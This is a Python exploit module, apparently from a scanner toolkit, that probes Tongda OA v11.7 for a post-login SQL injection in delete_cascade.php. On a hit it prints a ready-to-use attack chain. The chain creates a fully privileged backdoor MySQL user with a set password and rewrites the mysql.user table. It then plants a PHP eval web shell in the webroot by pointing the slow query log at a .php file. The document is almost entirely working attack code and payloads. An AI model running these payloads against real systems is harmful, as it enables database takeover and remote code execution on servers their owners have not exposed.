import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def exp():
    print('''利用链为：

        /general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION

        /general/hr/manage/query/delete_cascade.php?condition_cascade=UPDATE `mysql`.`user` SET `Password` = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('at666' AS Binary(5));


        general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;

        /general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@1

        /general/hr/manage/query/delete_cascade.php?condition_cascade=select @@basedir; # c:\td0a117\mysql5\，

        # 方法1：
        set global slow_query_log=on;
        set global slow_query_log_file='C:/td0a117/webroot/tony.php';
        select '<?php eval($_POST[x]);?>' or sleep(11);
    ''')


def 通达OA_v11_7_后台sql注入(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + "general/hr/manage/query/delete_cascade.php?condition_cascade=select if((substr(user(),1,1)='r'),1,power(9999,99))"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=30)
        if "信息删除成功" in response.text and response.status_code == 200:
            print(Vcolors.RED + "[+] 目标通达oa存在后台注入漏洞" +Vcolors.ENDC)
            exp()
        else:
            print(Vcolors.WARNING + "[x] 通达oa存在后台注入漏洞不存在" +Vcolors.ENDC)

    except:
        logging.error("通达OA_v11_7_后台sql注入脚本出现异常")


